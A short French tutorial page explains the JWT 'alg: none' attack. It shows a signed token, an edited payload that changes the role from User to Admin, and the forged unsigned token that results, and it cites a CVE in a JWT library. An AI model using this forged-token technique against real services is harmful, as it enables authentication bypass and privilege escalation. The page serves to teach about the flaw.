# JWS - "Alg: None" Attack

Cette attaque consiste à faire passer un jeton signé pour un jeton non signé afin de pouvoir en modifier son contenu. Par exemple, voici un jeton légitime signé reçu par l'attaquant :

```text
eyJhbGciOiJSUzI1NiIsICJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiU2hhcnBmb3JjZSIsInJvbGUiOiJVc2VyIn0.qo2Pr1Fo5c_HeItw85G8Tu8qWdQeIiB-HfPaWs-s2Wk
```

Son entête est le suivant \(après décodage Base64URL\) :

`{  
  "alg":"RS256",  
  "typ":"JWT"  
}`

Ainsi que la payload :

`{  
  "name":"Sharpforce",  
  "role":"User"  
}`

Ce jeton peut être modifié afin, par exemple, de s'octroyer les droits administrateur. Pour cela il suffit de modifier la payload comme ceci :

`{  
  "name":"Sharpforce",  
  "role":"Admin"  
}`

Le problème est que le service consommateur n'acceptera jamais ce jeton, car la signature n'est pas valide. Alors l'attaquant va simplement indiquer que le jeton n'est pas signé et supprimer la signature :

`{  
  "alg":"none",  
  "typ":"JWT"  
}`

`{  
  "name":"Sharpforce",  
  "role":"Admin"  
}`

Une fois encodé le jeton falsifié qui sera envoyé au service consommateur sera le suivant :

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiU2hhcnBmb3JjZSIsInJvbGUiOiJBZG1pbiJ9.
```

Le jeton pourra ainsi être considéré comme légitime et donc accepté par le service.

Cette attaque se retrouve par exemple dans la librairie `prime-jwt` dans les version &lt;= 1.30. La CVE correspondante est détaillée ici :

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2018-1000531" %}



